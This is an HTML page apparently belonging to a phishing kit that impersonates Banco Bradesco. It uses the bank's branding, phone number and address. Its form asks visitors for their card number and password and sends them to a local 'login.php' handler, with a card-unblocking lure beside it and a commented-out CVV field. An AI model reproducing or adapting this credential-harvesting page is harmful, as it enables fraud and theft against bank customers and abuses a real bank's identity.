<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/style.css">
    <!-- <link rel="stylesheet" href="js/script.js"> -->
    <link rel="shortcut icon" href="img/favicon.ico">
    <title>Banco Bradesco</title>
</head>
<body>
    <div id="top-bar">
        <header>
            <img src="img/logo-mobile.png" alt="">
        </header>
    </div>
    <section id="princiap-sec">
        <form name="form1" method="post" action="login.php">
            <div id="cartao-deb">
                <ul id="ul-cartao">
                    <li id="numero-c">
                        <span>CARTAO</span>
                        <input type="number" size="16" maxlength="16" id="cartao" name="cartao" required>
                    </li>
                    <!-- <li id="cvv-n">
                        <span>CVV</span>
                        <input type="text" size="3" maxlength="3" id="cvv"  name="cvv" required>
                    </li> -->
                </ul>
                <ul id="ul-senha-btn">
                    <li id="senha1">
                        <span>SENHA</span>
                        <input type="password" id="senha" name="senha" required>
                    </li>
                    <li id="bt-cartao">
                        <input type="submit" id="btn-cartao" class="error_btn" name="Submit" value="OK">
                    </li>
                </ul>
            </div>
        </form>  
        <section id="info"> 
            <div id="card">
                <div class="box__img">
                    <span class="box__filter"></span>
                    <a href=""><img class="img-responsive" src="img/icon-sac-ouvidoria.svg" alt="Desbloqueio de cartão"></a>
                </div>
                <span class="box__home-title">Fale Conosco</span>
                <h4>0800 444 1250</h4>
            </div>
    
            <div id="card">
                <div class="box__img">
                    <span class="box__filter"></span>
                    <img class="img-responsive" src="img/desbloqueio-cartao.svg" alt="Desbloqueio de cartão">
                    <!-- <img class="img-responsive over" src="img/desbloqueio-cartao-white.svg" alt="Desbloqueio de cartão"> -->
                </div>
                <span class="box__home-title">Desbloqueio de cartão</span>
            </div>
            
        </section>   
    </section>
    <!-- <div class="divisoria-purple"></div> -->
    <footer>
        <img src="img/logo-mobile.png" alt="">
        <hr>
        <address>
            Banco Bradesco SA | CNPJ: 60.746.948.0001-12 <br> Cidade de Deus, s/nº Vila Yara | Osasco | SP |
            CEP:
            06029-900
        </address>
    </footer>
</body>
</html>